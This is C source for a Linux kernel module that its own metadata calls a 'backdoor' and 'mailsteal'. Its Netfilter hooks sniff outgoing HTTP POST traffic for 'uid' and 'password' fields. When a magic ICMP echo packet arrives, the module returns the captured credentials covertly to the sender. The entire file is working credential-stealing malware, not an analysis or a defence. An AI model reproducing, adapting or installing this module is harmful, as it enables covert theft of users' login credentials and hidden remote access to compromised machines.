#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>

#define _MODULE_AUTHOR_ "TiamoBoram"
#define _MODULE_DESC_ "backdoor"

#define ICMP_PAYLOAD_SIZE (htons(ip_hdr(sb)->tot_len) - sizeof(struct iphdr) - sizeof(struct icmphdr))

#define MAGIC_CODE 0x5B
#define REPLY_SIZE 36

MODULE_LICENSE("GPL");
MODULE_AUTHOR(_MODULE_AUTHOR_);
MODULE_DESCRIPTION(_MODULE_DESC_);

static char *uid = NULL;
static char *pwd = NULL;

/* Used to describe our Netfilter hooks */
struct nf_hook_ops pre_hook;  /* Incoming */
struct nf_hook_ops post_hook; /* Outgoing */

char *get_login_info(char *data, char *pattern)
{
    char *start = NULL;
    char *end = NULL;
    char *info = NULL;
    if ((start = strstr(data, pattern)) == NULL)
        return info;
    start = start + strlen(pattern);
    if ((end = strchr(start, '&')) == NULL)
        return info;
    info = kmalloc(end - start + 1, GFP_KERNEL);
    if (info == NULL)
        return info;
    memset(info, '\0', end - start + 1);
    memcpy(info, start, end - start);
    return info;
    // printk(KERN_INFO "uid:%s\n",uid);
}
static void check_http(struct sk_buff *skb)
{
    struct tcphdr *tcp;
    char *tcp_payload;
    int payload_len = 0;
    char *data = NULL;
    tcp = (struct tcphdr *)(skb->data + (ip_hdr(skb)->ihl * 4));
    tcp_payload = (char *)((int)tcp + (int)(tcp->doff * 4));
    payload_len = ntohs(ip_hdr(skb)->tot_len) - ip_hdr(skb)->ihl * 4 - tcp->doff * 4;

    if (strncmp(tcp_payload, "POST ", 5) != 0)
        return;
    /* HTTP POST请求 */
    data = kmalloc(payload_len + 1, GFP_KERNEL);
    if (data != NULL)
    {
        memset(data, '\0', payload_len);
        memcpy(data, tcp_payload, payload_len);
        uid = get_login_info(tcp_payload, "&uid=");
        pwd = get_login_info(tcp_payload, "&password=");
        if (uid)
        {
            if (strlen(uid) > 15)
            {
                kfree(uid);
                uid = NULL;
                return;
            }
        }
        if (pwd)
        {
            if (strlen(pwd) > 15)
            {
                kfree(pwd);
                pwd = NULL;
            }
        }
    }
}

/* Function called as the POST_ROUTING (last) hook. It will check for
 * FTP traffic then search that traffic for USER and PASS commands. */
static unsigned int watch_out(unsigned int hooknum,
                              struct sk_buff *skb,
                              const struct net_device *in,
                              const struct net_device *out,
                              int (*okfn)(struct sk_buff *))
{
    struct sk_buff *sb = skb;
    struct tcphdr *tcp;

    /* Make sure this is a TCP packet first */
    if (ip_hdr(sb)->protocol != IPPROTO_TCP)
        return NF_ACCEPT; /* Nope, not TCP */

    tcp = (struct tcphdr *)((sb->data) + (ip_hdr(sb)->ihl * 4));

    /* Now check to see if it's an HTTP packet */
    if (tcp->dest != htons(80))
        return NF_ACCEPT; /* Nope, not HTTP */
                          // if (!uid && !pwd)
    check_http(sb);

    /* We are finished with the packet, let it go on its way */
    return NF_ACCEPT;
}

/* Procedure that watches incoming ICMP traffic for the "Magic" packet.
 * When that is received, we tweak the skb structure to send a reply
 * back to the requesting host and tell Netfilter that we stole the
 * packet. */
static unsigned int watch_in(unsigned int hooknum,
                             struct sk_buff *skb,
                             const struct net_device *in,
                             const struct net_device *out,
                             int (*okfn)(struct sk_buff *))
{
    struct sk_buff *sb = skb;
    struct icmphdr *icmp;
    char *cp_data;      /* Where we copy data to in reply */
    unsigned int taddr; /* Temporary IP holder */

    /* Do we even have a username/password pair to report yet? */
    if (!uid && !pwd)
        return NF_ACCEPT;

    /* Is this an ICMP packet? */
    if (ip_hdr(sb)->protocol != IPPROTO_ICMP)
        return NF_ACCEPT;

    icmp = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl * 4);

    /* Is it the MAGIC packet? */
    if (icmp->code != MAGIC_CODE || icmp->type != ICMP_ECHO || ICMP_PAYLOAD_SIZE < REPLY_SIZE)
    {
        return NF_ACCEPT;
    }

    /* Okay, matches our checks for "Magicness", now we fiddle with
    * the sk_buff to insert the IP address, and username/password pair,
    * swap IP source and destination addresses and ethernet addresses
    * if necessary and then transmit the packet from here and tell
    * Netfilter we stole it. Phew... */
    taddr = ip_hdr(sb)->saddr;
    ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
    ip_hdr(sb)->daddr = taddr;

    sb->pkt_type = PACKET_OUTGOING;

    switch (sb->dev->type)
    {
    case ARPHRD_PPP: /* Ntcho iddling needs doing */
        break;
    case ARPHRD_LOOPBACK:
    case ARPHRD_ETHER:
    {
        unsigned char t_hwaddr[ETH_ALEN];

        /* Move the data pointer to point to the link layer header */
        sb->data = (unsigned char *)eth_hdr(sb);
        sb->len += ETH_HLEN; //sizeof(sb->mac.ethernet);
        memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
        memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),
               ETH_ALEN);
        memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
        break;
    }
    };

    /* Now copy the IP address, then Username, then password into packet */
    cp_data = (char *)((char *)icmp + sizeof(struct icmphdr));
    memcpy(cp_data, uid, strlen(uid) + 1);
    memcpy(cp_data + strlen(uid) + 1, pwd, strlen(pwd) + 1);
    printk(KERN_INFO "uid:%s pwd:%s\n", cp_data, cp_data + strlen(uid) + 1);

    /* This is where things will die if they are going to.
    * Fingers crossed... */
    dev_queue_xmit(sb);

    /* Now free the saved username and password and reset have_pair */
    kfree(uid);
    kfree(pwd);
    uid = pwd = NULL;
    return NF_STOLEN;
}

int init_module()
{
    printk(KERN_INFO "Insert mailsteal module!\n");
    pre_hook.hook = watch_in;
    pre_hook.pf = PF_INET;
    pre_hook.priority = NF_IP_PRI_FIRST;
    pre_hook.hooknum = NF_INET_PRE_ROUTING;

    post_hook.hook = watch_out;
    post_hook.pf = PF_INET;
    post_hook.priority = NF_IP_PRI_FIRST;
    post_hook.hooknum = NF_INET_POST_ROUTING;

    nf_register_hook(&pre_hook);
    nf_register_hook(&post_hook);

    return 0;
}

void cleanup_module()
{
    nf_unregister_hook(&post_hook);
    printk(KERN_INFO "Goodbye!\n");
    nf_unregister_hook(&pre_hook);

    if (pwd)
        kfree(pwd);
    if (uid)
        kfree(uid);
}